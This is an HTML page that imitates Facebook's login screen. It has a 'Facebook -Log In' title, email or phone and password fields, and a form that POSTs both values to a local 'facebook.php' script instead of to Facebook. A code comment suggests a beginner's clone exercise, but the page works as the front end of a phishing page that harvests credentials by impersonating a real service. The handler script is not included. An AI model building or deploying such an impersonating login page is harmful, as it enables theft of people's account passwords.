<!DOCTYPE html>
<html>
	<head>
		<title>Facebook -Log In</title>
		<meta charset="utf-8">
		<!-- meta name="viewport" assists in making a site mobile responsive -->
		<meta name ="viewport" content="width=device-width, initial-scale=1.0">
		<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
		<link rel="stylesheet" href="css/facebook.css">
	</head>
	<body>
	<form method="POST" action="/facebook.php">
		<header>
			<h1>facebook</h1>

			<p>
				<label for="email_phone">Email or Phone</label>
			</p>
				<input type="text" name="email_phone" id="email_phone">
			<p>
				<label for="password">Password</label>
			</p>
				<input type="password" name="password" id="password">
			<p>
				<a href="/facebook.php">Forgot account?</a>
			</p>
			<p>
				<button type="submit">Log In</button>

		</header>
	</form>
	</body>
</html>